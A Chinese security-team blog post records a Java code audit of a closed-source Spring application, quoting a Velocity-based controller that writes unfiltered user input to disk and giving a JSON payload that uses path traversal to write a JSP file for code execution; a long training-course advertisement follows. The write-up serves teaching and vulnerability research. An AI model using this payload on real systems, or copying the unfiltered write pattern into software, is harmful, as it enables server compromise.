#  JAVA代码审计第一个RCE出货记录  
 威零安全团队   2026-04-22 01:49  
  
# 免责申明本文章仅用于信息安全防御技术分享，因用于其他用途而产生不良后果,作者不承担任何法律责任，请严格遵循中华人民共和国相关法律法规，禁止做一切违法犯罪行为。  
  
一、前言  
  
    好朋友给了一份闭源的JAVA源码，今天来审计审计，正好检验在小朋友师傅那里学习的如何。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kT0XF3jjTwz8ibu7O0CsRk6QZZWIZvHKqVoaNWV334UhxcjTRykWPOA2PvFQ8ko0ThR1ep5FjicDV3N6lUPl2F5WB0n8gFwPoib28/640?wx_fmt=png&from=appmsg "")  
## 二、框架分析  
  
    在拿到源码之后发现全部为jar包类型的文件，这里靠向Spring方向，进行搜索特征他的路由相关例如：@PostMapping等信息，或者@Controller均可，或者直接搜索Servlet的特征例如：生命周期的方法：service以及doget或者dopost等，逐一排除。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRibl31xaDeSCTfWL3RU1eribJicRvQ3SNxIsn2y1Kljulg74HBriby846mAP1SbAk2zoZuiaUFad7Qlw661IwOq93pYLgg10PaaUy0/640?wx_fmt=png&from=appmsg "")  
  
    搜索后发现确实是Spring类型的源码，那么开始打开小朋友师傅的课件，审计开始审计这套源码。  
## 三、鉴权分析  
  
    因为当时给到了源码之后已经是3G左右，过于庞大，在寻找鉴权的时候发现部分源码是丢失状态，或者不知道跑哪里去了，只是隐隐约约的知道为shiro鉴权，因为我搜到了它。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRmhjP6PS2b022z83Ft1rNRgVCtnf2C7aDo3GC1a7EVHmIwBnfibSEyvibNmxMtZxQlP9o5qycciaAEAOwibuEjHFiaSk94lSYBhbF0/640?wx_fmt=png&from=appmsg "")  
  
    然后再去寻找对应的拦截路径相关的鉴权处理并未找到，询问过后发现确实为部分源码丢失造成的，不过这个也好解决，因为我们有网站对应的Controller路由信息，直接AI提取路由跑一下就可以一眼看出来哪些是拦截的哪些不是拦截的。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQnoN5Zftdc3QNzzDpm5UPy9DeUc3cSmicSPEnyycr5ujOMcCAAaOad0Cews1nfdBru5zbzibrqla7Lq0AvFHPSibM2ZAtHJrWBbI/640?wx_fmt=png&from=appmsg "")  
  
    这个命令不错，可以记下来：  
```
ounter(line
find . -name "*.java" | xargs grep -l "@RequestMapping\|@GetMapping\|@PostMapping\|@PutMapping\|@DeleteMapping\|@PatchMapping" 2>/dev/null | head -100
```  
  
    (有AI可以提升很大的审计效率，要是按照以前的办法，现在就要自己手搓一些脚本还要各种调试了）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kS2BqaTicSwHhJsE8fwtgNwN9icXJ8ujgXXgoWk7X1uYoYSpkWJQicydubhbNkWNia6ub3KCibQxO0Q6A5XWZib1VXpzj5B31o34OBmY/640?wx_fmt=png&from=appmsg "")  
  
    然后就是跑了一圈也没发现存在302等信息，随便从路由当中复制一个Controller都可以访问，那这就好办了，下一步开始审计漏洞。  
## 四、RCE漏洞审计  
  
        最终在某一个Controller当中发现存在一个任意文件写入  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRUoGfv1Fic8DdWmmRNkOqJJfQvlC6GrVmqaI7ia3icGUL50WzVeJmmumy6leBd1c0ZDv0jpFBNClBCGkqolPibqm81MasBiaptPAa4/640?wx_fmt=png&from=appmsg "")  
  
    首先传递参数为vo类，通过vo类的get方法来获取对应的具体参数名。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQucNOmQBM6eXiaqkmj98vtv2TOMG3sxf2KSnb7CBQBWwouRkaCczic9x79Fk69hGl4CJGKO6AeFACVLFA92RmGniaDia5Ydzdf8Rg/640?wx_fmt=png&from=appmsg "")  
  
    在这里可以传递四个参数，分别为template、path、fileName、tempext四个参数。  
  
    并且四个参数分别path决定路径：  
```
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line
@PostMapping({"/createHtml1"})
    @ResponseBody
    @ApiOperation("发布")
    public JsonResult createHtml1(@RequestBody CreateHtmlVo vo) {
        String path = this.configModelService.getFrontPath() + File.separator + "pub" + File.separator + "html" + vo.getPath();
        Velocity.init();
        VelocityContext context = new VelocityContext();
        StringWriter stringWriter = new StringWriter();
        Velocity.evaluate(context, stringWriter, "mystring", vo.getTemplate());
        File file = new File(path);
        file.mkdirs();
        file = new File(path + File.separator + vo.getFileName() + "." + vo.getTempext());
        InputStream inputStream = null;
        try {
            inputStream = new ByteArrayInputStream(stringWriter.toString().getBytes("UTF-8"));
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        inputstreamtofile(inputStream, file);
        Map<String, String> map = new HashMap();
        map.put("path", "/pub/html" + vo.getPath() + "/" + vo.getFileName() + "." + vo.getTempext());
        return this.renderSuccess(map);
    }
```  
  
    其中fileName决定相关文件名但是不包含后缀，后缀通过tempext来决定，之后直接进行写入到文件当中，对传入的参数未作任何过滤，那么我们通过path决定路径，fileName决定文件名称，tempext决定后缀文件类型，那么文件控制如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRLrjoLKV4gbD6TAbc1oKsV11fNuIgrYC4WsuI4t5Xr6EbjicY49xs6BQQcc0wEdEA6Grr1iaHPUXrM5QdV05XWV8mSsDmia4Ev2c/640?wx_fmt=png&from=appmsg "")  
  
    这里其实就是SSTI进行渲染模板的操作，渲染完之后在进行写入，然而渲染的内容就是我们的参数Template，当然这也说明我们不只是可以进行任意文件写入，还可以直接打模板漏洞。  
## 五、漏洞复现  
  
构造一下payload：  
```
{
  "path": "/../../../upload/headimg",
  "fileName": "test",
  "tempext": "jsp",
  "template": "<%out.println(\"Hello World\");%>"
}
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTtsl1QTebDIgeTEvjuSoKnuXI3KoTv7ZNvqg8lk4TvOwQzRxzULf7WPxa6vaVkxs0egY1C8Q9phYyDba9EjO7oCkGEAcdsJKY/640?wx_fmt=png&from=appmsg "")  
  
      
成功写入，进行访问。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kQv4m6DX1dTus84oyCzKbjibqXfQXTwfTlAUJJIPQwYBIjuibIQANT4icvvAGdOzEicBmD8Q0hrv8VmF4UBIfibH1MIGq62WySAp7pY/640?wx_fmt=png&from=appmsg "")  
  
    这里成功进行RCE，同样在这里进行宣传html文件进行模板注入也是可以的，但是RCE我们只需要一个就够了，目的在于学习哈哈哈。  
  
**广告区域**  
  
  
             历经四期培训，终于迎来了代码审计第五期培训，本次培训依旧一次报名一直可听，并且富含前面四期课程均可以听，先来看看之前的培训都有哪些内容，这里我给大家截屏看看。  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/HBLcNkZ8PQddO5DZYzH4GcwlsOwEK5cR1A5XZuWXTP3ib3tWpcAtuLUaliasnZQvBmenGd0UNicFQOsJGyIzodicicg/640?from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=0 "")  
  
一、往期-第四期课程  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/dJGuszYr5iaRGiaZURAxJAROibCh1sjaZictcbC4iasuuOgCMQSDSwrG5Wfrx2QgfvKx8icDhm0gIia8fN6mThehEK8ww/640?from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=1 "")  
  
###       
  
  
###     我们先来看看上一期课程内容，内容如下，给各位师傅们讲解上一期课程讲解了哪些内容，包括相关的学员出货记录，以及部分课件内容。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/HD0HxvpnwC5ZeImfWYKsmFnrQxS8uec0lgeqCdbhfrzK5af1GicN0VznKVcCJFJwfqDVFIopkWP0OQxia5Y2Fj7g/640?&wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=2 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/vjKYWs9y65W5n4PxYWtJKL6NFQ5b33EDmVhhibZ7XqTbzFP6AKT75NO9ruuOia5WEJlbCukAFpHGbhicHv0elprLg/640?&wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=3 "")  
  
往期-第四期基础课程  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/byR65XibZJfW0aVCxh4yatvn7mHPias6u1M2xpeaYD31jyyrHgz550eWgUu6O2KFmah7jZVsyceicfXzRh2nR2pyA/640?&wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=4 "")  
  
  
  
  
###   
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kT5WAraqkSHR2giaHn4vHz3QBmBF3crefdIBkpqXSHZRCjIscaCocia5d1HvibabvCAboZojE71gY9jIibflOHyo5p9Kiad96LceDhg/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=5 "")  
  
此为第四期基础课程，共计授课四十次，此外第四期相较于第三期新增了APP、小程序、WEB逆向，同时主线仍然在代码审计上面，其中基础课程主要目的为：  
  
掌握代码审计思路、完成0-1、能够独立开始审计项目  
。  
  
讲解方向如下：  
  
  
✅ NET代码审计  
✅ APP、小程序、WEB逆向  
  
✅ JAVA代码审计  
  
  
（当然个人认为讲的最好的是JAVA代码审计，而且此次代码审计偏向0-1的实现，更多的是讲解完漏洞原理之后小朋友带着进行实战代码审计，分析各个项目，从理论→实践的演变，当然小朋友们每个课程都是这种方式。）  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/HD0HxvpnwC5ZeImfWYKsmFnrQxS8uec0lgeqCdbhfrzK5af1GicN0VznKVcCJFJwfqDVFIopkWP0OQxia5Y2Fj7g/640?&wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=6 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/vjKYWs9y65W5n4PxYWtJKL6NFQ5b33EDmVhhibZ7XqTbzFP6AKT75NO9ruuOia5WEJlbCukAFpHGbhicHv0elprLg/640?&wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=7 "")  
  
往期-第四期  
进阶课程  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/byR65XibZJfW0aVCxh4yatvn7mHPias6u1M2xpeaYD31jyyrHgz550eWgUu6O2KFmah7jZVsyceicfXzRh2nR2pyA/640?&wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=8 "")  
  
  
  
###   
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kS7R0X2cFmI9FwoZUDVCEhnfj90RHfrX3xf6ibYdTzy6hia6vaM9fLEvLTuRpD9A3TxD0ulcweksPsPrmjZKibmToQLkZ9z7qcDvs/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=9 "")  
  
  
    为什么在第四期课程分为了基础课程以及进阶课程，就是因为发现学员大部分都是为了审计而去审计，单一的去使用某一个方法审计漏洞，而不会进行漏洞的组合拳，扩大危害，  
**虽然自己都是实战案例，但是发现学员都是跟着案例当中的漏洞去套用在了自己的源码\项目当中**  
。  
  
所以开启了第四期进阶代码审计课程，课程目的主要为：  
  
  
✅   
深入理解鉴权  
  
✅   
漏洞组合拳扩大危害  
  
✅   
尝试0-1贴合多数学员完成前台RCE出货  
  
  
（本次授课累计20余次，专项针对以上目的，大量分析鉴权&绕过、组合拳利用、前台RCE）  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/HD0HxvpnwC5ZeImfWYKsmFnrQxS8uec0lgeqCdbhfrzK5af1GicN0VznKVcCJFJwfqDVFIopkWP0OQxia5Y2Fj7g/640?&wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=10 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/vjKYWs9y65W5n4PxYWtJKL6NFQ5b33EDmVhhibZ7XqTbzFP6AKT75NO9ruuOia5WEJlbCukAFpHGbhicHv0elprLg/640?&wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=11 "")  
  
往期-第四期-部分学员报喜&课件  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/byR65XibZJfW0aVCxh4yatvn7mHPias6u1M2xpeaYD31jyyrHgz550eWgUu6O2KFmah7jZVsyceicfXzRh2nR2pyA/640?&wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=12 "")  
  
  
  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRHrbYYUx1SsrTzMvLd6PHe94oTDNrbEcODv9sK93GCBYBHtce0RdgAYqyGv1BtwEjwhYic3eWY4bvrh93lHMQzI7CF3jQDIzuM/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=13 "")  
  
  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kQPNR5bcIoytlnkctFobib1AuS1zySZeVvDYQtD3tFZEzELb58FUwhia0iahKUg6tpIMpPiasdvLTcwSgibPH13WBC4uviatON7v6ARk/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=18 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRDUdq8CgZ4vPITrlVLy9k0ORfuicLkHmCfzDFx7gB4kiaYGS0icp5eyJXT1HatNQCPkvIPerQBsG1JcNmTq395Frnibegm3NX8hM4/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=19 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRg5NlbUsEjl2UqMiafWl1NOp5fJbgIWZKvxTWsQe0UODLOe45aARbvxfg8d0qmFNqjcnm01q6lfmEovtKZiacibQ2664jEibDdRoc/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=20 "")  
  
  
  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/G4zicxKmtXXhicvpUX9R0fxBOic1XNQdlPRrh27zNXQlQ9UYKWLzvZvPYqu3licIgC4v7j1ArN4vfJjoxp4MgTvFmA/640?from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=25 "")  
  
上下滑动查看更多  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Pu52Sn0jPu0EbVUSia7W7sUxTVicmhGmYTkl23iaZv7FdOTQE7bh7lb3gMR7hqLULFpHDq5UyDClYpOMAgnLljB2w/640?from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=26 "")  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRqRiaD0ol1syAqMKj2CJqbEpXFYoW73Uiav5mwvmUsNPWJMCYOoQnl3Db7Q8sokBdcCdHQFnNBcrJDmPDvG9NfvNiciaZJn0fkIl8/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=27 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTQNjnWLJSnAl4IpbSUibbQVichRmcGxybauU3aRDx3Xyt0qDOSGxQjtDGB4nWcxOnX7uVeWNJhP5o7cwyBaNoa7bknoGKNjFVMA/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=28 "")  
  
  
  
  
  
  
  
  
  
**左右滑动查看更多**  
  
**>**  
  
    那么可能会有师傅提问，为什么没有PHP呢，其实PHP也是有讲解的，只不过大部分是直接的案例，基础的PHP代码审计函数以及基础等，均放在了第三期课程当中。  
  
（部分课件）  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kSyyQdKYiaCGzIzoBMQvTTr5t7aUgXmpeL8GX96tRKS1knQ2iaVzOw2c6MsHjaHacCrUoiaHV8ibZaQ2Qsgtgbcuv8vJDYI8dSUrKw/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=45 "")  
  
    这也是为什么有的学员在报名之后，我会给他规划学习路线，先看xxx在看xxx，这些都是小朋友认为哪一期的那些内容讲的不错，然后给兄弟们总结出来的优质学习路线。  
  
那么接下来我们可以看看小朋友在做了四期培训之后  
学员出货报喜时刻：  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/HD0HxvpnwC5ZeImfWYKsmFnrQxS8uec0lgeqCdbhfrzK5af1GicN0VznKVcCJFJwfqDVFIopkWP0OQxia5Y2Fj7g/640?&wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=46 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/vjKYWs9y65W5n4PxYWtJKL6NFQ5b33EDmVhhibZ7XqTbzFP6AKT75NO9ruuOia5WEJlbCukAFpHGbhicHv0elprLg/640?&wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=47 "")  
  
往期-学员报喜时刻（部分）  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/byR65XibZJfW0aVCxh4yatvn7mHPias6u1M2xpeaYD31jyyrHgz550eWgUu6O2KFmah7jZVsyceicfXzRh2nR2pyA/640?&wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=48 "")  
  
  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTWghKPU8RCEUglFN02tZp9tic3cc4Sj6W4g5VIiaGSIIyqWXe1U3jz7vsjEe4TJUMZ7Rw7GZiaiautO737t051OiaWse5yWV61EjN8/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=49 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTBWiaLsMia8oxGuKYeScgPaJv5RyyoSFptE2wfRUoZh0zt15sZvrb4nFyFTcdYXqCkS8zl8jdvz6bpMUrbPiajrK51zADLwfYIM4/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=50 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRnSxOTvvL0MODaQfK3y0509rZgRu6gLcJrROWliaeQgqP2tWjlmsQ0JMkic15wNDvhsa2OC0RKLxkm2hTianqPEDW7Up32HiaT5n4/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=51 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRaibDvU2LDmhF3mwsVtfINSTJ60nzxjiaxZGibibndAeLnJvJeiabgBXbxbRkxauvoOdUG5ctDaI3t9OgwaEPu6JWhRhEkuhRE1sbQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=52 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQoZhsgwtrltib8hBqaavKZJBPzAjpNbzEOickFf6bzK4X8ockPL2z7YYtTMKbU9aVyjia6TSavsBAZq7Hja7LooBhA8QiaZhvSsBM/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=53 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTryN4fJmyd0MFZjfRMic3jpLM1JMryQm888HI5bmy8gZU4sGVGFk5KPk7LJUh2oRvwuIcKYplptiak2Rp2c2YzMLPwFpn45oibQg/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=54 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kSFfNId4NrLEibic4nAibErKkZnX0WvQYYSqvqEdBB8Ay5uDZZHnKAWAxK8y4WLGEibxXtuwEJMfViakrbd0mzia4HxquUbCDjdJibq7k/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=55 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTuLJMea93M9lAD7VtJibJGHO64jAiaN3S3zSIt0T3lWjEwJssBOOBZzAn7LL4GsJicbyl9gbL9aRchWBNPcJgibqJACv7dIMb5G00/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=56 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRlS6G4ib7ym1Tq14gJicHJavDmhwWy1NmHXvT5UX9cHVZg8VTZdm8c2uQEmXVNqFuBNQicuTpzXRaSOKeWvnyPfnXU3slicQL6sfw/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=57 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kQQVib1EqdBnDibwzWSnG3wfz3fgn9B2B4TSSyCU3Th0VTyoMBGoTNQkns3D4qdBE8WYCkb8f2DJ8u6LmiaMcffr0jJ8iayfRG4RBk/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=58 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTibHj2nB0kTu1JOqmckfVcr7EICpK3fy8QHRh8C6ia4Bia6gnicJpZAHy9m4Q9z5hEUOwgQp0nTPJ7sjz2yXAWz9pfyQk5x332CNo/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=59 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQXCZrGicFzY6J8FxthOoQJFYktU9DEjs9WwYBKfmu7swhIXdebxMyOVkmjJumUFicHqawueo6Mwx84r86CNhpYxBVDfRn9CD4NU/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=60 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Dfrm5V3o6kRck1YQUmchtU6cvF0icv66MQ2JlCH7TAJSVZkjDmeEYWdYuW7r4Gn5c22ByttK65V0ldZJywhLr5LRnZ3FfSmDmaXaiaswRNgMs/640?wx_fmt=jpeg&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=61 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQF4zIicK318t3Pf3C8g121bAS94Wom6BkJlkofOPTKGdhEYS9Nu7KwThEoSfEXicouv2rMX6M5cBw6tbwtbC3bDNmPhBcPZktHA/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=62 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTeUoLerVotEJ5YV8PLCdwrX6QV9licbMVDB5L6hjFPAERnthcic3qMyI3MrGeW381NEQHdzg7xX6fEvqsCZAib8jMnOxzU9GJmKo/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=63 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Dfrm5V3o6kQGun2JU8Knk5hUkDyLp2RyjmVtXjkjibp8stxRZzHBldkToOtoEQeLrRYYtdbvOD5QLjn6ia3LYQwOAeiclkGmB0nIajNlibYVwPo/640?wx_fmt=jpeg&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=64 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQWZMXbQTc6iaV4PyGE0GibnBckxSGRmx6ibuhuCbecNlRPZMMWxxSykTZ73fjLLRHexu6ILtPRfSr0KfXVGA9DtiatepxBFWQCHtg/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=65 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQ8txbGUMJ1gJFQibsqNHT0Ma7jeV3QRtgGCjIFAbHnJ5LNCJicWCr1GDb0av8v6dCGS8zQ5G1GgUpzsebp5l9vR9k4aoXoia1kPc/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=66 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kSqg9WOpKoIiack9kFSIPKeKI6kYLplHKgoiaxPlhNIqvggSMKxDRdqgUA6T8YgQYKeTeswYmRNYGfW7glibzicg1vosF5kl6qc408/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=67 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRjlU9x4jh1XKl5ZZZ6kD1pUgTvGVrOwibp8Yia0eeZWGkXEcyiazNgga2RqIrEBicWhicCLJOLME5xlXibpk5iaqr5vlaibFkDd6ibZ2Mw/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=68 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kSemmzGfpt12UiblrtrBDyr7jFuMjBFDt9T67Yia6QIZXib5x8ap2fRgwfiadhDo4MAOibBict8tKQRIGzK0SCjS4cZH0icQ4kz9Pdpzw/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=69 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTw8UIKGkiatWWkvL8XbJia3jqXKnWJcvibibFasSossElXzQqnjupzy1F2pFUZS1BXjrsScXvH1h9ibtZKic3kI9Ad5YK6MBM6NLEyM/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=70 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kSEFiaiaLDqKlTEqgjS6uibs6esXevJiad5jTq40yFUgcnricOKqhj2V9te9GWwRDjrvpw0k5ApTicb68icGDKWW05cugEctmL2lr406A/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=71 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRWGeticE5gcLdQQcic4Z8cDI3PR5icGV1811pse8DXBvPaQsXdSic3RRHwj3K5V1GYN567kr0BwBmna784jqp5BtctOph2dZanHxo/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=72 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQRGIWIbGEuUfzW3QuSEz9ibaEFJ1TxdvSEHdZyrf27FrkJ1ItGicgePZMXr8icqenianFnR1CwR40wXMp8AcdTN2InTJHIxwenekE/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=73 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRddQp5Xy9z2R2XiaQs24v6SDBPWhljz8bMRhdNMRA0BmqZH9cQJztiadRJl1bz1pcCg21TnBBicia0kuBViakGhKlWGndwG4btTL5s/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=74 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kSic9OAwwZKnn53okzoqgejbZESAibFTk8rKW9XNB2AbhwInD02ThRJOQ9BiabTDOCoBasrM0rO8NLYEiadVRbUDbvRQnemAtgzO8I/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=75 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kSRn1vRZXt9hI65rHgAUKDsor5vIUibBqrXB9PLPc2cvSPcpgRibEKv3riay9cpndHHXoUVnMT2cvBqUlfbnia9fNwRvUmXLML9yR4/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=76 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRIJTTic9vxvKPtvxcn1UibUuub0wiaK0qkqDbSvTyVpRr05nloAwKsv6Kjia1Y8NVvYcVXMtWia8lmcoyViazy3oBO0gWGNxSnUdfj8/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=77 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTAibnKxrvoFFGIv0yEfOtSuFxDnEBNj2tfficicOb0Rs6njIv7hEhwJw47jyK5dzZ2cHZjWTdQPD4X3pJeKWurNz99D1IxibgwyKk/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=78 "")  
  
